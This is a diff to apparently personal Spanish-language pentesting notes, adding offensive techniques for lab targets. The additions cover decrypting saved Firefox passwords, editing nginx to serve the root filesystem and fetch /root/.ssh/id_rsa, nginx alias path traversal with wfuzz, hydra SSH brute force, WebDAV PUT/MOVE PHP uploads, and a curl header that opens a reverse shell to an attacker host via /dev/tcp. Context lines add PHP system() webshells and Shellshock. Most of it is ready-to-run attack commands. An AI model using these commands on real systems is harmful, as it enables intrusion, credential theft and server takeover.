@@ -1,6 +1,83 @@
 	
 ----
 
+## Firefox
+
+>Si obtenemos la backup de firefox y encontramos los archivos **key4.db y logins.json**, podremos desencriptar y obtener la passwd
+
+- Repo de herramienta para desencriptar [Firefox Decrypt](https://github.com/unode/firefox_decrypt.git)
+```bash
+python3 firefox_decrypt.py rutaDeLos2Archivos
+```
+
+## Nginx
+
+1. 
+https://github.com/unode/firefox_decrypt.git
+> Si podemos editar el archivo **/etc/nginx/nginx.conf** una vez ganado acceso , nos da lugar a poner a **root y toda su raíz para leerlo desde fuera**
+
+- Configuración de nginx
+```bash
+worker_processes 1;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    server {
+        listen 9999;
+
+        location / {
+            root  /;
+            index  index.html index.htm;
+        }
+    }
+}
+```
+
+- Leer **Priv key ssh**, desde atacante
+```bash
+curl http://IP:9999/root/.ssh/id_rsa
+```
+
+2. Si tenemos la siguiente configuración  del archivo 
+```bash
+erver {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+
+        root /var/www/html;
+
+        index index.html index.htm index.nginx-debian.html;
+
+        server_name _;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+
+        location /bak { # Aquí es donde la palma, porque da lugar a hacer un Path Traversal por no poner otro "/"
+                alias /var/backups/;
+        }
+}
+```
+
+- Entonces podemos hacer fuerza bruta con **..** para ver que directorios hay y encontrar los **log** a ver que users hay
+```bash
+# Fuzzing
+wfuzz -c --hc=500,404,400,403 -w /usr/share/wordlists/dirb/common.txt "http://192.168.1.159/bak../FUZZ"
+
+# Encontramos log
+wfuzz -c --hc=500,404,400,403 -w /usr/share/wordlists/dirb/common.txt "http://192.168.1.159/bak../log/FUZZ.FUZ2Z"
+# Encontramos logs
+wfuzz -c --sc 200 -w /usr/share/wordlists/dirb/common.txt -z list,log "http://192.168.1.159/bak../log/FUZZ.FUZ2Z" 
+```
+- Podemos encontrar un user y bruteforcear con **hydra**
+```bash
+hydra -t 30 -l omar -P /usr/share/wordlists/rockyou.txt  ssh://192.168.1.159 -I -F 
+```
+
 ## GIT 
 
 >Esto no es una vuln pero es interesting
@@ -15,6 +92,24 @@ git log
 git show Chorrocommit
 ```
 
+## Curl
+
+> Un poquito de curl
+- El payload debe de estar en el mismo directorio con el mismo nombre que subimos 
+
+- Si escaneando vemos esto
+```bash
+|_  Potentially risky methods: PUT MOVE
+```
+- Vemos que podemos subir y bruteforceamos la extensión con **Burp**
+```bash
+curl -v -k -X PUT http://192.168.1.149:8080/dmd.php -d @dmd.php
+ --> extensión a bForcear
+```
+- Como tenemos **MOVE** habilitado, podemos cambiar de extensión el archivo en este caso a **php**
+```bash
+curl -v -k -X MOVE  -H "Destination: http://192.168.1.149:8080/pampampam.php" "http://192.168.1.149:8080/dmd.txt"
+```
 ## SQLI
 
 > Todos los sqli manuales lo tendremos en la carpeta de [PuestaenProducción](Z:\Estudios\PuestaProduccion)
@@ -467,6 +562,13 @@ curl -s -X GET "http://victima.com/victima" -H "User-Agent: <?php system('whoami
 curl -s -X GET "http://victima.com/victima" -H "User-Agent: <?php system(\$_GET["cmd"]); ?>"
 ```
 2. `&cmd=whoami`
+
+- **No es log poisoning **
+>Hay un exploit que poniéndo la cabecera **Backdoor** puedes editarla y ejecutar comandos ,  **SI EN EL APARTADO LOADED MODULES** está cargado **mod_backdoor**
+
+```bash
+curl -s -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.1.135/4444 0>&1'" -X GET "http://192.168.1.144"
+```
 
 > Contaminar **Logs ssh**
 
@@ -1030,7 +1132,7 @@ ls -d up*|while read line; do mkdir $line/uploads;chown -R www-data:www-data $li
 
 Other useful extensions:
 
-- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
+- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_, .phar
     - **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
 - **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
 - **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
@@ -1058,7 +1160,7 @@ Content-Type: application/octet-stream
 <?php system($_GET['cmd']); ?>
 ```
 
-5. Cambiar el MAX_File para cambiar el size
+5. Cambiar el MAX_File en el HTML para cambiar el size
 6. Cambiar el **MIME Type** a --> `image/jpeg`
 7. De este modo
 ```Burpsuite
@@ -1215,7 +1317,7 @@ http://192.168.1.135:5000/redirect?newurl=https:evil%252ecom
 
 - davtest --> Prueba a subir muchos archivos maliciosos
 ```bash
-davtest -utl http://localhost -auth admin:admin 2>&1
+davtest -url http://localhost -auth admin:admin 2>&1
 ```
 
 - Oneliner **BruteForce** a webdav
@@ -1289,7 +1391,7 @@ curl http://127.0.0.1:3306 --proxy http://targetip:3128 --output salida
 > Atentos al archivo **/cgi-bin** en un fuzzing, fuzzear después de /cgi/bin también y la versión **bash** debe ser antigua
 > El server a atacar debe procesar las peticones en **BASH**
 
-- Esto e suna función vacía y según tu versión bash no es capaz d ecerrar la función antes de definirse
+- Esto e suna función vacía y según tu versión bash no es capaz de cerrar la función antes de definirse
 ```bash
  () { :; }; 
 ```
